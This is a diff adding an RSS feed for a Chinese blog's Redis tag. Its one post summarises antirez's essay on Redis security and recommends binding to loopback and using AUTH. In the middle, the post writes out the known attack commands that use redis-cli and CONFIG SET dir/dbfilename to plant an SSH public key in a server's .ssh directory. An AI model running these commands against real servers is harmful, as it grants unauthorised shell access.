@@ -1,0 +1,72 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>璐濒殉漂流记</title>
+    <link>https://lawulu.github.io/tags/redis/feed/index.xml</link>
+    <description>Recent content on 璐濒殉漂流记</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>zh-CN</language>
+    <atom:link href="https://lawulu.github.io/tags/redis/feed/index.xml" rel="self" type="application/rss+xml" />
+    
+    <item>
+      <title>Redis的安全哲学</title>
+      <link>https://lawulu.github.io/post/Redis%E7%9A%84%E5%AE%89%E5%85%A8%E5%93%B2%E5%AD%A6/</link>
+      <pubDate>Mon, 15 Feb 2016 00:00:00 +0000</pubDate>
+      
+      <guid>https://lawulu.github.io/post/Redis%E7%9A%84%E5%AE%89%E5%85%A8%E5%93%B2%E5%AD%A6/</guid>
+      <description>
+
+&lt;p&gt;最近看到Redis的作者antirez写的一篇blog: &lt;a href=&#34;http://antirez.com/news/96&#34;&gt;http://antirez.com/news/96&lt;/a&gt;
+里面有些东西很有意思.摘录一些观点:&lt;/p&gt;
+
+&lt;h2 id=&#34;为什么redis这么多-安全漏洞&#34;&gt;为什么Redis这么多&amp;rdquo;安全漏洞&amp;rdquo;?&lt;/h2&gt;
+
+&lt;p&gt;作者说经常收到一些Redis不安全的Report,但是大部分Report其实跟Redis没有什么关系或者说对Redis来说无关紧要.因为Redis的绝大多数用户都是将Redis放到一个安全的环境里面,而安全是一个很大的feature,Redis不会为了一小撮用户做开发这么复杂的功能.
+&amp;gt;it’s totally insecure to let untrusted clients access the system, please protect it from the outside world yourself&lt;/p&gt;
+
+&lt;h2 id=&#34;一次hack过程&#34;&gt;一次Hack过程&lt;/h2&gt;
+
+&lt;p&gt;安全页面写到: &lt;a href=&#34;http://redis.io/topics/security&#34;&gt;http://redis.io/topics/security&lt;/a&gt;
+&amp;gt;the ability to control the server configuration using the CONFIG command makes the client able to change the working directory of the program and the name of the dump file. This allows clients to write RDB Redis files at random paths, that is a security issue that may easily lead to the ability to run untrusted code as the same user as Redis is running&lt;/p&gt;
+
+&lt;p&gt;所以,使用config命令可以往主机的Path写文件,作者展示了这一过程(为防止有些&lt;code&gt;script kiddies cut &amp;amp; paste the attack&lt;/code&gt;,没有直接提供一个脚本,并且还首先备份了当前的数据,这里省略一些无关紧要的步骤):&lt;/p&gt;
+
+&lt;ol&gt;
+&lt;li&gt;生成一对RSA key,并且写到一个文件里面,前后加上换行符
+&lt;code&gt;
+$ (echo -e &amp;quot;\n\n&amp;quot;; cat id_rsa.pub; echo -e &amp;quot;\n\n&amp;quot;) &amp;gt; foo.txt
+&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;将public key写到一个KV里面
+&lt;code&gt;
+cat foo.txt | redis-cli -h 192.168.1.11 -x set crackit
+&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;设置工作目录
+&lt;code&gt;
+config set dir /Users/antirez/.ssh/
+&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;将内存中数据保存到Db文件中
+&lt;code&gt;
+config set dbfilename &amp;quot;authorized.keys&amp;quot;
+save
+&lt;/code&gt;&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;大功告成!&lt;/p&gt;
+
+&lt;h2 id=&#34;为什么不默认bind-127-0-0-1&#34;&gt;为什么不默认bind 127.0.0.1?&lt;/h2&gt;
+
+&lt;p&gt;事实上,如果启动时候带上默认的配置文件(redis.conf),就不存在这个安全隐患,因为配置文件里面默认是只绑定了Loopback address.既然作者知道这个安全隐患,为什么不默认启用这个配置文件呢?(就像Mysql那样).&lt;/p&gt;
+
+&lt;p&gt;作者的解释是,因为RTFM（Read The Fucking Manual）&lt;/p&gt;
+
+&lt;h2 id=&#34;使用auth&#34;&gt;使用Auth&lt;/h2&gt;
+
+&lt;p&gt;虽然并不能真正解决安全问题..最简单有效的方法就是使用Auth.使用Auth的的几点说明:
+1. 密码要尽可能的复杂,以防被brute force
+2. Auth的消耗非常少,只是在连接建立时候做一次鉴权,只有连接在,就不用再做鉴权
+3. 未来可能会有ACL机制,比如某些用户并没有&lt;code&gt;config set dir&lt;/code&gt;的权限&lt;/p&gt;
+</description>
+    </item>
+    
+  </channel>
+</rss>
